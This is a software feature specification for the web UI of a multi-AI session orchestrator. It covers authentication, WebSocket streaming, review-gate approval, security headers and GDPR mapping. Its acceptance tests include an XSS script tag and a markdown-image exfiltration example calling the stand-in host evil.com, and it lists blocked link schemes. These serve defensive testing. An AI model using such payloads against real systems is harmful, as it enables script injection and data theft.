# Feature Specification: Web UI

**Feature Branch**: `011-web-ui`
**Created**: 2026-04-16
**Status**: Ready for planning
**Input**: Constitution S14 Phase 2 scope + sacp-web-ui-spec.md design reference
**Reference**: `sacp-web-ui-spec.md` (detailed design document, not normative — this spec selects what to build)

## Clarifications

### Session 2026-05-02 (audit fix/011-operations — Phase E)

- Q: What's the deploy semantics for Web UI session affinity? → A: Phase 1 single-instance topology — all WS connections terminate at the same orchestrator process. Multi-instance (Phase 3) requires WS session affinity (sticky sessions on the load balancer) OR session-state externalization (Phase 3 SessionStore Redis backend). Today, on redeploy, all WS connections close; clients reconnect within FR-014 backoff window.

- Q: What's the operational risk if `cdn.jsdelivr.net` or `unpkg.com` is unavailable? → A: The UI fails to load — React, ReactDOM, marked, DOMPurify, Babel are all CDN-fetched. No fallback bundle ships in Phase 1. SR-001 SRI integrity attributes prevent tampered responses but do not provide availability. Phase 3 mitigation: server-side bundling. Until then: accepted residual; CDN uptime is a deployment dependency.

- Q: How does browser cache invalidate across deploys? → A: SR-008 `Cache-Control: no-store` on `/` and `/api/*` ensures the SPA HTML + dynamic responses fetch fresh on each load. CDN-fetched scripts (jsdelivr, unpkg) are versioned in URL (`react@18.2.0` etc.); cache invalidation is the URL change. If the deploy bumps the React version, browsers fetch the new URL.

- Q: What reverse-proxy configurations are supported? → A: Phase 1 documented configurations are Caddy, nginx, Cloudflare. Required: WS upgrade headers (`Upgrade`, `Connection`), `X-Forwarded-For` set, `X-Forwarded-Proto: https`. CSP reporting (`/csp-report` POSTs) must be allowed through. Operator's reverse-proxy MUST NOT strip the `X-SACP-Request: 1` CSRF header on mutations. See runbook §13.2.

- Q: Does the Web UI support multi-tenant deployments (multiple operator orgs on one instance)? → A: No. Phase 1 is explicit single-tenant — one `SACP_*` env-var set, one DB, one origin. Multi-tenant is Phase 3+ scope (out of scope per Constitution §3 topologies 1-7 single-deployment).

- Q: What's the CSP-report log volume risk? → A: A misconfigured CSP can flood logs (e.g., a CDN URL not in connect-src triggers a report on every page load). Phase 1 has no rate-limit on `/csp-report`; the endpoint logs at WARNING and returns 204. Operator mitigation: monitor CSP-report ingest rate; if sustained > 10/sec for the same blocked-URL, fix the CSP rather than let logs grow. Phase 3 trigger: any deployment observing log-volume DoS via CSP reports; implementation: per-origin rate-limit on `/csp-report`.

### Session 2026-05-02 (audit fix/011-compliance — Phase D)

- Q: Does the Web UI's auth cookie require a consent banner? → A: No. The single `sacp_session` HttpOnly cookie qualifies for ePrivacy Art. 5(3) "strictly necessary" exemption (required to deliver the authenticated service the user requested). No marketing, analytics, or fingerprinting cookies in Phase 1. Adding any non-strictly-necessary cookie in Phase 3 requires the operator to add a compliant consent UI.

- Q: Does the join flow surface Art. 13 information-to-be-provided? → A: No. SACP surfaces participant role + session visibility on connect (FR-003 + state_snapshot) but does not present operator identity / processing purposes / subject-rights routing. That UI is the operator's responsibility and lives in their onboarding wrapper. Phase 3 trigger: any deployment where the Web UI is the primary participant-facing surface (no operator wrapper).

- Q: Does loading React / Babel / DOMPurify from CDN constitute Art. 44 cross-border transfer? → A: For EU data subjects, yes. The browser request to `cdn.jsdelivr.net` and `unpkg.com` leaks client IP + page URL to Cloudflare-fronted CDNs. SR-002's `Referrer-Policy: no-referrer` minimizes the referrer leak; client IP is unavoidable. Phase 3 mitigation: server-side bundling (eliminates the CDN); trigger: any EU deployment where the CDN transfer is unacceptable.

- Q: How does CSP report-uri (`/csp-report`) handle PII? → A: Violation reports may contain blocked-URL fragments including PII (if exfiltration was attempted). The endpoint logs at WARNING through 007 §FR-012 ScrubFilter; retention is operator-controlled application-log retention. Phase 3 trigger: any deployment with regulatory log-retention requirements demanding a separate purge schedule.

### Session 2026-05-01 (audit fix/011-testability — Phase B)

- **JS test framework decision**: Playwright (via `pytest-playwright`, already in `[e2e]` extras) is the adopted framework for browser-requiring tests. The frontend is a CDN-loaded React SPA with no build system (`type="text/babel"`, script tags, no package.json), so Jest and Vitest have no module entry point to target. Playwright drives a real browser against the running server, covering the shipping artifact as-is. Server-testable items (SR-010, SR-011, per-directive CSP) land in `tests/test_011_testability.py` (Phase B). Browser-only items (SR-001a frame cap, SR-009 forbidden link schemes, SR-012 malformed-frame full flow, FR-014 auto-reconnect backoff, US-by-US e2e, CDN-failure graceful-degradation) are deferred to Phase F with Playwright. FR-to-test traceability for all 011 FR/SR markers added to `docs/traceability/fr-to-test.md`.

- **Per-IP WS cap (audit H-03)**: The 4429 `CLOSE_TOO_MANY` close code documented in `contracts/websocket-events.md` is now enforced server-side via `SACP_WS_MAX_CONNECTIONS_PER_IP` (default 10). The `WebSocketManager` reserves a slot atomically before `accept()` so a hostile peer cannot win a half-handshake race; the slot is released on `unregister`. Pre-fix the constant was defined but never wired, so a single host could open unbounded WS upgrades and exhaust the manager.

- **Opaque session cookie + server-side bearer store (audit H-02 / M-08)**: The session cookie now carries an opaque sid only; the bearer + `(participant_id, session_id)` binding lives in a process-local `SessionStore` keyed by that sid. Pre-fix the cookie payload was a base64-readable JSON blob containing the bearer, so cookie-jar exfiltration (compromised endpoint, malicious browser extension, downgraded-link intercept) recovered the token directly. `/login` mints an sid via `SessionStore.create`; `/logout` deletes it; `/me` and the WebSocket upgrade resolve sid → entry → revalidate the stored bearer. Cookies that survive logout cannot be replayed because the sid no longer maps to anything. The bearer is still returned to JS via `/me` for cross-origin MCP calls — eliminating that requires a same-origin proxy refactor and is tracked separately.

- **Independent cookie-signing key (audit M-02)**: Cookie signing now reads `SACP_WEB_UI_COOKIE_KEY` instead of `SACP_ENCRYPTION_KEY`. The two secrets have different threat models — one protects at-rest API-key encryption, the other guards session-cookie integrity — and reusing one for both meant a leak of either compromised both. The new var is required at startup with the same `>= 32 chars + no placeholder` shape as `SACP_AUTH_LOOKUP_KEY`. Cookie salt bumped to `sacp-ui-cookie-v2` so any pre-fix cookies are explicitly rejected on first read.

- **Same-origin MCP proxy + bearer fully off the SPA (audit H-02 closure)**: The Web UI now exposes `/api/mcp/<path>` as a same-origin proxy that resolves the cookie sid → server-side `SessionEntry` → attaches `Authorization: Bearer …` to the upstream request before forwarding to `SACP_WEB_UI_MCP_ORIGIN`. Both `/me` and `/login` responses no longer return the bearer to JS, and the SPA's `mcpCall` helper switches from cross-origin Bearer auth to same-origin cookie auth. The "Show my token" SPA affordance is removed — users save the bearer at issuance via the create / add-participant token-reveal modals. Defense-in-depth: the proxy strips client-supplied `Authorization` (so a compromised SPA cannot use the proxy as a bearer-validation oracle) and any upstream `Set-Cookie` (so a misconfigured MCP build cannot clobber the Web UI session cookie). A small bootstrap allowlist (`tools/session/create`, `tools/session/request_join`, `tools/session/redeem_invite`) forwards without an Authorization header — the upstream routes are public by design and the SPA needs them before any cookie exists.

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Facilitator Creates and Monitors a Session (Priority: P1)

A facilitator opens the Web UI at port 8751, enters their bearer token, and lands on a session view showing the live transcript, participant list, and session controls. They can inject messages, pause/resume the loop, add participants, and watch AI turns stream in real-time via WebSocket.

**Why this priority**: This is the primary use case — replacing Swagger UI as the operational interface.

**Acceptance Scenarios**:

1. **Given** a valid facilitator token, **When** they log in, **Then** the session view loads with transcript, participant sidebar, and controls.
2. **Given** a running session, **When** a new AI turn completes, **Then** the message appears in the transcript within 2 seconds via WebSocket.
3. **Given** the facilitator view, **When** they type a message and press Ctrl+Enter, **Then** the message is injected into the session.
4. **Given** a running loop, **When** the facilitator clicks Pause, **Then** the loop stops and the status badge updates to "paused".

---

### User Story 2 - Participant Observes and Interjects (Priority: P1)

A participant enters their token and sees the transcript and their own controls (routing mode, prompt tier). They can inject messages but cannot access facilitator-only controls (add/remove participants, session config, audit log).

**Why this priority**: Participants need a usable interface beyond Swagger to follow and contribute to conversations.

**Acceptance Scenarios**:

1. **Given** a participant token, **When** they log in, **Then** facilitator-only controls are hidden.
2. **Given** a participant view, **When** they inject a message, **Then** it appears in the transcript at the correct position.
3. **Given** a participant, **When** they change their routing preference, **Then** the change takes effect on the next turn.

---

### User Story 3 - Real-Time WebSocket Streaming (Priority: P1)

The UI maintains a WebSocket connection to the server for push-based updates. New messages, participant status changes, convergence updates, and session events arrive without polling. The connection auto-reconnects on drop with exponential backoff.

**Why this priority**: Polling the REST API would miss real-time events and waste bandwidth. WebSocket is the backbone of the live experience.

**Acceptance Scenarios**:

1. **Given** a connected WebSocket, **When** a turn completes, **Then** a `message` event arrives with full message content.
2. **Given** a dropped connection, **When** the client reconnects, **Then** it receives a full `state_snapshot` to resync.
3. **Given** an expired token, **When** the WebSocket closes with code 4401, **Then** the client stops reconnecting and shows a re-login prompt.

---

### User Story 4 - Budget and Convergence Dashboard (Priority: P2)

The right sidebar displays per-participant budget utilization (spend vs. limit) and a convergence sparkline showing similarity over the last 50 turns. The facilitator sees exact costs; participants see their own costs and utilization percentages for others.

**Why this priority**: Situational awareness for cost management and conversation quality. Without this, facilitators must repeatedly call debug/export to check costs and convergence.

**Acceptance Scenarios**:

1. **Given** a participant with `budget_daily` set, **When** turns accrue cost, **Then** the budget bar shows utilization percentage and changes color as it approaches 100%.
2. **Given** 10+ turns, **When** convergence is computed, **Then** the sparkline graph renders similarity scores with a threshold line.
3. **Given** a non-facilitator participant, **When** viewing another participant's budget card, **Then** only the utilization percentage is shown, not exact dollar amounts.

---

### User Story 5 - Review Gate Draft Approval (Priority: P2)

When a participant's AI is in `review_gate` mode, drafts appear in the right sidebar with Approve/Edit/Reject buttons. The facilitator can review the draft content, see security flags from the output validation pipeline, and resolve the draft before the timeout expires.

**Why this priority**: Review gate is a key human-in-the-loop safety mechanism. Without a UI, approval requires raw API calls.

**Acceptance Scenarios**:

1. **Given** a participant in review_gate mode, **When** their AI generates a response, **Then** the draft appears in the ReviewGateQueue with content and action buttons.
2. **Given** a pending draft, **When** the facilitator clicks Approve, **Then** the response enters the transcript.
3. **Given** a pending draft, **When** the timeout expires, **Then** the draft is auto-rejected and the turn is skipped.

---

### User Story 6 - Facilitator Admin Panel (Priority: P2)

The facilitator has a collapsible admin panel in the left sidebar with: pending participant approvals, session config editing, invite link generation, and an audit log of facilitator actions.

**Why this priority**: Session management currently requires multiple Swagger endpoints. Consolidating into a panel improves facilitator workflow.

**Acceptance Scenarios**:

1. **Given** a pending participant, **When** the facilitator clicks Approve, **Then** the participant becomes active and appears in the participant list.
2. **Given** the session config panel, **When** the facilitator changes `convergence_threshold`, **Then** the change is applied and logged in the audit trail.
3. **Given** the invite generator, **When** the facilitator clicks Generate, **Then** a copyable invite link is shown.

---

### User Story 7 - Proposal and Decision Tracking (Priority: P3)

Participants can create proposals (decisions to be voted on). Active proposals appear in the right sidebar with vote tallies. Participants vote Accept/Reject/Abstain. Resolved proposals collapse to a summary line.

**Why this priority**: Decision tracking is a Phase 2 constitution requirement but can ship after core UI is stable.

**Acceptance Scenarios**:

1. **Given** an active proposal, **When** a participant votes, **Then** the tally updates in real-time for all connected users.
2. **Given** all participants have voted, **When** the proposal resolves, **Then** it moves to the resolved section with final status.

---

### User Story 9 - Summary Viewer (Priority: P2)

The facilitator (or any participant) can open a "Summary" panel that displays the latest structured summarization checkpoint for the session: decisions, open questions, key positions per participant, and a narrative overview. The view refreshes when a new checkpoint is generated.

**Why this priority**: Phase 1 generates structured summaries every N turns (`GET /tools/session/summary`), but without a UI the facilitator has to read raw JSON to review them. This is the primary artifact for long-running sessions.

**Acceptance Scenarios**:

1. **Given** a session with at least one summarization checkpoint, **When** the user opens the Summary panel, **Then** decisions, open questions, key positions, and narrative render as readable sections.
2. **Given** the Summary panel is open, **When** a new checkpoint is generated, **Then** the panel refreshes to the newest summary.
3. **Given** a session with no summary yet, **When** the user opens the panel, **Then** a placeholder indicates "no checkpoint yet" with the turn threshold info.

---

### User Story 11 - Guest Landing (Priority: P1)

A first-time visitor lands on the Web UI without a token and sees three paths: **Sign in** (paste an existing token), **Create a new session** (become a facilitator), or **Request to join a session** (by session ID). The token-first AuthGate is replaced so non-facilitator humans can self-onboard without the facilitator needing to manually distribute tokens.

**Why this priority**: The prior flow required every human to obtain a bearer token out-of-band before they could even see the dashboard, which broke normal onboarding. Guest landing removes that friction and makes the UI usable as a first touchpoint.

**Acceptance Scenarios**:

1. **Given** a guest with no cookie, **When** they open the UI, **Then** the landing page offers Sign in / Create / Request to join.
2. **Given** the Create form, **When** the guest enters their name and submits, **Then** a session is created with a git-branch-style slug, the facilitator display name is prefixed `Facilitator-<name>`, and a token-reveal modal displays the bearer token with a copy button.
3. **Given** the facilitator acknowledges the token-reveal, **When** they click "enter the session", **Then** they land in the standard SessionView with their new session ready.
4. **Given** the facilitator's SessionView, **When** they click the session name in the header, **Then** an inline input lets them rename it and the new name broadcasts to every subscriber.

---

### User Story 12 - Request to Join by Session ID (Priority: P1)

A guest who wasn't given a token can enter an existing session ID plus their display name to submit a join request. The server creates a `role='pending'` participant and returns an auth token; the guest logs in and sees a minimal holding screen (session name + list of human participants) while the facilitator approves or rejects them. On approval, they transition seamlessly into the normal SessionView.

**Why this priority**: Pairs with US11 to complete the self-onboarding flow — without it, facilitators still have to generate invites or tokens manually for every new participant. Also unblocks pending-participant testing of US6 AC1 which was previously unexercisable.

**Acceptance Scenarios**:

1. **Given** a guest with a known session ID, **When** they submit `{session_id, display_name}` via Request-to-join, **Then** the server creates a pending participant and returns an auth token.
2. **Given** a pending participant logged in, **When** they connect the WebSocket, **Then** the state_snapshot is filtered to session name + human participants only (no transcript, no AI roster).
3. **Given** the facilitator's admin panel shows N pending participants, **When** they click Approve on one, **Then** that participant's client receives a `participant_update` event flipping their role to `participant` and the UI escalates from the holding screen to SessionView.
4. **Given** the facilitator's loop controls, **When** they click Start with no human message posted yet, **Then** the call returns `409` with an explanatory message — the loop refuses to dispatch so the first turn can't be an AI hallucinating a welcome message.

---

### User Story 10 - Participant Health Indicators (Priority: P2)

Each participant card in the left sidebar surfaces health state: `active`, `paused` (manually or by circuit breaker), `offline`, `pending approval`. When a participant is auto-paused by the circuit breaker (`consecutive_timeouts ≥ 3`), the card shows a distinct "breaker tripped" badge with the failure count, distinguishing it from manual pauses. The facilitator can see recent failure reasons (from `routing_log` skip entries).

**Why this priority**: Phase 1 auto-pauses participants on repeated provider failures, but without a health indicator facilitators can't tell *why* an AI went quiet — was it removed, paused manually, or tripped by auth errors? This is critical for diagnosing session issues.

**Acceptance Scenarios**:

1. **Given** a participant with `consecutive_timeouts=3` and `status=paused`, **When** viewing their card, **Then** a "breaker tripped" badge is visible with the timeout count.
2. **Given** a manually paused participant, **When** viewing their card, **Then** the badge reads "paused" without the breaker indicator.
3. **Given** a facilitator view, **When** a participant has recent skip entries, **Then** hovering the health badge shows the last 3 skip reasons.

---

### User Story 8 - Secure Content Rendering (Priority: P1)

AI-generated message content is rendered as markdown with mandatory security controls: raw HTML stripped, images neutralized, links sanitized, invisible Unicode characters revealed. Review gate drafts display output validation risk scores and security flags.

**Why this priority**: The transcript renders untrusted AI output. Without security controls, the UI is vulnerable to XSS, data exfiltration via markdown images, and context poisoning via invisible characters.

**Acceptance Scenarios**:

1. **Given** a message containing `<script>alert(1)</script>`, **When** rendered, **Then** the script tag is stripped entirely.
2. **Given** a message containing `![img](https://evil.com/x?data=secret)`, **When** rendered, **Then** the image is replaced with `[Image: img]` text.
3. **Given** a message containing zero-width spaces, **When** rendered, **Then** visible `[ZWS]` markers appear and a warning badge shows the count.
4. **Given** a link with `javascript:` scheme, **When** rendered, **Then** the link is blocked and replaced with a warning span.

---

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: Web UI served by FastAPI on port 8751, separate from the MCP API on 8750.
- **FR-002**: Single-file React JSX (CDN-loaded, no build toolchain). Split to modules if exceeding ~2000 lines.
- **FR-003**: Bearer token authentication via login screen. Token held in HttpOnly cookie or React ref — never in localStorage/sessionStorage. After `POST /tools/participant/rotate_token`, the UI MUST treat the existing cookie + ref as invalid (redirect to AuthGate; WebSocket will close 4401 on next upgrade).
- **FR-004**: WebSocket connection at `ws://<host>:8751/ws/{session_id}` for real-time push events.
- **FR-005**: Server sends `state_snapshot` on WebSocket connect with full session state.
- **FR-006**: Transcript renders markdown with security overrides. Raw HTML stripped. Images neutralized to `[Image: alt]` text. Links with `javascript:` / `data:` / `vbscript:` / `file:` schemes rendered as warning spans. Invisible / bidirectional Unicode code points (U+200B..U+200F, U+202A..U+202E, U+2066..U+2069, U+FEFF) replaced with visible `[LABEL]` markers and each message shows a "⚠ N hidden" count badge.
- **FR-007**: Three-column layout: left sidebar (participants + controls), center (transcript + input), right sidebar (budget + convergence + proposals + review gate).
- **FR-008**: Responsive: sidebars collapse to drawers below 1024px.
- **FR-009**: Facilitator controls gated by role — hidden for non-facilitator participants.
- **FR-010**: Budget dashboard shows per-participant spend vs. limits with data visibility enforcement per privacy policy. Backend derives `spend_daily` from `log_repo.get_participant_cost(pid, period="daily")` and ships it on every `state_snapshot.participants[*]` and on `participant_update` events fired after each persisted AI turn.
- **FR-011**: Convergence sparkline graph of similarity over last 50 turns with threshold line.
- **FR-012**: Review gate queue with Approve/Edit/Reject and timeout countdown. Backed by Phase 1 endpoints: `GET /tools/facilitator/list_drafts`, `POST /tools/facilitator/approve_draft`, `POST /tools/facilitator/reject_draft`, `POST /tools/facilitator/edit_draft`.
- **FR-013**: Proposal tracker with voting and real-time tally updates.
- **FR-014**: Auto-reconnecting WebSocket with exponential backoff. Initial delay 1s, doubles per failure, capped at 30s. Respects close codes (4401 = stop, 4403 = stop, 4429 = backoff with jitter, 1006 = retry).
- **FR-015**: Message injection via text input with Ctrl+Enter send. Backed by `POST /tools/participant/inject_message`.
- **FR-016**: Facilitator admin panel: pending approvals, session config, invite generation, audit log. Backed by `POST /tools/facilitator/{approve_participant,reject_participant,remove_participant,create_invite,transfer_facilitator,set_budget,set_routing_preference}` and the audit rows from `GET /tools/debug/export`.
- **FR-017**: Session export (markdown/JSON) via download button. Backed by `GET /tools/session/{export_markdown,export_json}`.
- **FR-018**: Summary panel rendering the latest structured checkpoint. Backed by `GET /tools/session/summary`.
- **FR-019**: Review-gate pause-scope toggle in the facilitator admin panel (session-wide vs. per-participant). Backed by `POST /tools/facilitator/set_review_gate_pause_scope`.
- **FR-020**: Participant health indicator (active / paused-manual / paused-breaker / offline / pending) with breaker-trip count and recent skip reasons surfaced from the `participant_update` WebSocket event and the participant row in `GET /tools/debug/export`.

### Security Requirements

- **SR-001**: CSP header. `script-src 'self' 'unsafe-eval' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net` — the two pinned CDN origins are required by FR-002 (CDN-loaded, no build toolchain), `'unsafe-eval'` is required by Babel Standalone's runtime JSX compilation via `new Function(...)`, and `'unsafe-inline'` is required because Babel injects the transpiled module back into the DOM as an inline `<script>` element that `script-src-elem` would otherwise block. The precompile-at-build alternative is tracked for a future phase when a frontend toolchain is introduced. SRI integrity attributes are required on every cross-origin CDN `<script>` (task T204); `frontend/app.jsx` is a same-origin static asset and therefore exempt from SRI. `connect-src 'self' <SACP_WEB_UI_MCP_ORIGIN> <ws-equivalent> <SACP_WEB_UI_WS_ORIGIN>` — operator sets the env vars to their deployment's MCP and Web UI WS origins; the previous broad `ws: wss:` was tightened to explicit origins to close an exfiltration channel if any future XSS slips past DOMPurify. `default-src 'self'`, `style-src 'self' 'unsafe-inline'`, `img-src 'self'`, `font-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`, `report-uri /csp-report`. No `data:` URIs for images. CSP violations POST to `/csp-report` (logged at WARNING, returns 204) so silent regressions are visible in server logs; the endpoint is exempt from CSRF-header enforcement because browsers cannot add custom headers to violation reports.
- **SR-001a**: WebSocket frame size MUST be capped (default 256 KB via `ws_max_size` on the uvicorn config in `src/run_apps.py`). The default uvicorn cap is 16 MB, which is large enough that a malicious server (or compromised orchestrator) could OOM a browser tab via a single oversized frame. SACP messages are bounded above by `MAX_MESSAGE_CONTENT_CHARS = 2_000` so 256 KB leaves comfortable headroom for state_snapshot payloads while closing the OOM surface.
- **SR-002**: Security headers on all responses (canonical values pinned in `src/web_ui/security.py`):
  - `Strict-Transport-Security: max-age=31536000; includeSubDomains` (1 year, includes subdomains).
  - `X-Content-Type-Options: nosniff`.
  - `X-Frame-Options: DENY`.
  - `Referrer-Policy: no-referrer`.
  - `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Phase 1 denies camera, microphone, and geolocation; additional directives (`payment=()`, `usb=()`, `magnetometer=()`, `xr-spatial-tracking=()`) are deferred — trigger: when Web UI introduces any feature that touches a Permissions-Policy-controlled API.
  - `Cache-Control: no-store` (SR-008).
- **SR-003**: CORS restricted to own origin only. No wildcard.
- **SR-004**: WebSocket upgrade validates Origin header. Missing or mismatched origins closed with 4403. Allowed origins come from `SACP_WEB_UI_ALLOWED_ORIGINS` (CSV), defaulting to same-origin (Origin matches the request's own `Host`). Required by constitution §9.
- **SR-005**: No `dangerouslySetInnerHTML` on unsanitized content. Only on markdown-rendered output with security overrides active.
- **SR-006**: CSRF protection via `X-SACP-Request: 1` custom header on all mutations.
- **SR-007**: API keys and system prompts never displayed in the UI.
- **SR-008**: `Cache-Control: no-store` on all API responses and the HTML page (also tracked in SR-002 for consolidation).
- **SR-009**: Markdown link rendering MUST add `rel="noreferrer noopener"` to every `<a>` tag with `target="_blank"`. Forbidden URL schemes for `<a href>`: `javascript:`, `data:`, `vbscript:`, `file:` (current Phase 1 set in `frontend/app.jsx`). Additional schemes (`chrome-extension:`, `moz-extension:`, `intent:`, `ms-windows-store:`) are deferred to Phase 3; trigger: any deployment that observes a renderable href with a non-allowlisted scheme.
- **SR-010**: Pending participants (002 §FR-020 + §US12) MUST receive a filtered state_snapshot containing session name and human-participant list only — no transcript, no AI roster. Filtering is applied at `src/web_ui/snapshot.py:_pending_snapshot`. Ongoing WebSocket events (message, convergence_update, review_gate_staged) for pending participants are NOT separately filtered in Phase 1+2: pending participants connected via WebSocket may receive transcript-relevant events. Filter-on-broadcast is deferred to Phase 3 — trigger: any operator observation that pending participants gleaned transcript content from live events. The mechanism (`broadcast_to_session_roles`) already exists in `src/web_ui/websocket.py`; activation requires routing each call site through the role-aware variant.
- **SR-011**: Sensitive participant fields (`api_key_encrypted`, `auth_token_hash`, `bound_ip`, `system_prompt`) MUST be stripped from WS state_snapshot payloads at the server-side allow-list serializer (`_participant_dict` in `src/web_ui/snapshot.py`). The Web UI defends in depth: even if the server forgets, the React renderer's allow-list silently drops unknown / sensitive keys. Defense-in-depth is intentional duplication — see also 010 §FR-4 / §FR-9 for the debug-export equivalent and CI guard.
- **SR-012**: Malformed WebSocket frames received by the client (invalid JSON, missing required fields) MUST be discarded with a `console.warn` log; the WebSocket connection MUST NOT be torn down. The client re-syncs at the next `state_snapshot` event (sent on reconnect per FR-005) so transient parser failures don't propagate user-facing errors.

### Key Entities

- **SessionView**: The main UI container binding a user to one session's real-time state.
- **WebSocket Event**: A server-push message (message, participant_update, convergence_update, etc.).
- **ReviewGateDraft**: An AI response staged for human approval before entering the transcript.
- **Proposal**: A decision item with voting from participants.
- **Summary**: A structured checkpoint (decisions, open questions, key positions, narrative) generated periodically by the turn loop and returned by `GET /tools/session/summary`.
- **ParticipantHealth**: Derived status combining `status`, `consecutive_timeouts`, and recent `routing_log` skip entries for a participant, used by the health indicator.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Facilitator can create a session, add participants, inject messages, and monitor the loop entirely from the Web UI — no Swagger needed.
- **SC-002**: New AI turns appear in the transcript within 2 seconds of completion via WebSocket.
- **SC-003**: WebSocket reconnects within 30 seconds of a network drop and resyncs state.
- **SC-004**: All XSS test vectors (script tags, markdown images, javascript: links, invisible Unicode) are neutralized in rendered output.
- **SC-005**: Budget dashboard shows real cost data matching debug/export values.
- **SC-006**: Review gate drafts can be approved/rejected from the UI, with the result appearing in the transcript.

## Assumptions

- Phase 1 MCP API (port 8750) remains the backend. The Web UI adds a second FastAPI app on port 8751 that proxies to the same database and services.
- No build toolchain — React, ReactDOM, and marked loaded from CDN. All components in a single HTML file (or small number of JS modules).
- Dark theme default. Light theme toggle is desirable but not required for initial ship.
- WebSocket is server-push only. Client mutations go through REST endpoints. The WebSocket carries `pong` and `subscribe` messages from client.
- Virtualized transcript scrolling deferred until performance degrades (simple DOM rendering with ~200 message cap initially).
- Session creation wizard, invite/onboarding flow, and export UI are simple enough to implement directly from the API spec — no separate sub-specs needed.
- Branching UI, sub-session navigation, and OAuth 2.1 are Phase 3 — not in scope here.
- Accessibility audit (keyboard nav, ARIA, screen reader) is a follow-up pass after initial implementation.

## Threat model traceability

| FR / SR | Defends against | OWASP ASVS L2 v4.0.3 | NIST SP 800-53 |
|---------|------------------|----------------------|----------------|
| FR-003, FR-014, SR-009 (token storage + WS close codes + safe link rels) | Token theft, window-name attacks, replay | V3.4, V3.7 | IA-2, SC-23 |
| FR-006, SR-005, SR-009 (markdown sanitization + scheme blocking) | XSS, exfiltration via malicious URLs | V14.4 | SI-15 |
| FR-009, FR-016 (role-gated controls + admin panel) | Privilege escalation in browser | V4.1 | AC-3 |
| SR-001, SR-001a (CSP + WS frame cap + report-uri) | XSS, inline-script injection, OOM via WS frame, silent CSP regression | V14.4 | SI-15, SC-5, AU-2 |
| SR-002 (HSTS / X-Content-Type-Options / X-Frame-Options / Referrer-Policy / Permissions-Policy / Cache-Control) | Downgrade attack, MIME-sniff XSS, clickjacking, referrer leak, capability misuse, sensitive-state caching | V14.3, V14.4 | SC-7, SC-8, SC-23 |
| SR-003, SR-004 (CORS strict + WS Origin validation) | Cross-origin reuse of authenticated session | V14.5 | SC-7 |
| SR-006 (custom CSRF header) | CSRF on mutation endpoints | V13.2 | SC-23 |
| SR-007, SR-011 (no API-keys/system-prompts in UI + defense-in-depth strip) | Credential / system-prompt leak via UI | V14.3 | SC-28 |
| SR-008 (Cache-Control: no-store) | Sensitive state cached by browser / proxy | V14.4 | SC-28 |
| SR-010 (pending-snapshot filter) | Pre-approval information disclosure | V4.2 | AC-3 |
| SR-012 (graceful WS frame parser) | Malformed-input crash / DoS | — | SI-10 |

Sister cross-references: token rotation invalidates the UI session via 002 §FR-008 + this spec FR-003; markdown sanitization runs server-side at 007 §FR-001 / §FR-006 / §FR-007 and again at the renderer (defense in depth); the SSE-side counterpart to SR-001a's WS frame cap is 006 §FR-013 (bounded queue with drop-on-full); the sensitive-field allow-list mirrors 010 §FR-9's CI guard.

### GDPR / ePrivacy article mapping (Phase D fix/011-compliance, 2026-05-02)

Authoritative project-wide GDPR mapping is in `docs/compliance-mapping.md`. The 011-specific mappings are:

| FR / SR | Article | Mapping |
|----|----|----|
| `sacp_session` cookie | ePrivacy Art. 5(3) "strictly necessary" exemption | No consent banner required for auth indicator |
| US12 join flow | Art. 13 | Operator's responsibility (info-to-be-provided UI lives in operator wrapper) |
| SR-001 CSP + report-uri | Art. 32(1)(b) | Confidentiality + integrity of UI state |
| SR-001 third-party CDN | Art. 44 | International transfer (browser → jsDelivr / unpkg); operator-DPIA item |
| SR-007 (no keys / system-prompts in UI) | Art. 32(1)(a) | Confidentiality of operator secrets |
| SR-010 (pending-snapshot filter) | Art. 5(1)(c) | Data minimization on pre-approval state |
| SR-011 (WS strip-list) | Art. 5(1)(c), Art. 32(1)(a) | Data minimization + pseudonymisation at WS boundary |
| SR-012 (graceful WS parser) | Art. 32(1)(c) | Availability of UI under malformed input |
| Phase 3 self-service download | Art. 15, Art. 20 | Subject access + portability (deferred) |

## Compliance / Privacy (Phase D fix/011-compliance, 2026-05-02)

This section documents 011's privacy posture around cookies, third-party CDN risk, CSP reporting, and the WS data-minimization boundary. Authoritative project-wide compliance mapping is in `docs/compliance-mapping.md`.

### Cookie classification (ePrivacy / GDPR Art. 7)

The Web UI uses ONE cookie:

| Cookie | Purpose | Classification | Consent required? |
|----|----|----|----|
| `sacp_session` (HttpOnly, Secure, SameSite=Strict) | Authenticated-session indicator post-login (per FR-003) | Strictly necessary (ePrivacy Art. 5(3) exemption) | No |

No marketing, analytics, or fingerprinting cookies. No third-party cookies. ePrivacy's "strictly necessary" carve-out applies — the cookie is required to deliver the service the user explicitly requested (authenticated session).

If future Phase 3 features add any non-strictly-necessary cookie (analytics, A/B testing, marketing), the operator MUST add a compliant consent UI before deploying — SACP does not currently bundle one.

### Lawful basis on join (Art. 6 / Art. 13)

US12 request-to-join flow surfaces the participant's sign-in but does NOT presently surface a lawful-basis selection or Art. 13 information-to-be-provided notice. This is the operator's responsibility:

- Lawful basis is determined at the deployment-policy layer (see 002 Compliance / Privacy section, "Lawful basis (Art. 6)")
- The operator's onboarding / consent UI MUST surface Art. 13 information (controller identity, purposes of processing, retention, subject-rights routing) BEFORE the participant joins
- SACP itself does not present this UI — it surfaces participant role + session visibility on connect (FR-003 + `state_snapshot`)

Phase 3 trigger: any deployment serving EU data subjects where the Web UI is the primary participant-facing surface (no operator wrapper). At that point, an Art. 13 modal MUST be added to the join flow with operator-supplied controller info.

### CSP report-uri PII handling (SR-001)

`/csp-report` receives CSP violation reports. Violation reports may contain:

- Blocked-URL fragments (path + query string of the violating resource) — may include PII if a malicious script attempted to exfiltrate via URL
- Referrer (page that loaded the violating script) — minimized by `Referrer-Policy: no-referrer` (SR-002)
- Source-file location of the violating script

Retention and access policy:

- Endpoint logs at WARNING level
- Logs flow through 007 §FR-012 root-logger ScrubFilter (credential pattern redaction applies)
- Retention: tied to operator's overall application log retention policy (NOT a separate purge); Phase 3 trigger: any deployment with regulatory log-retention requirements demanding a separate purge schedule
- Access: operator-internal (server-side log access)

The `/csp-report` endpoint is exempt from CSRF-header enforcement because browsers cannot add custom headers to violation reports — this is a documented carve-out, not a CSRF gap.

### Third-party CDN risk (Art. 44, ePrivacy)

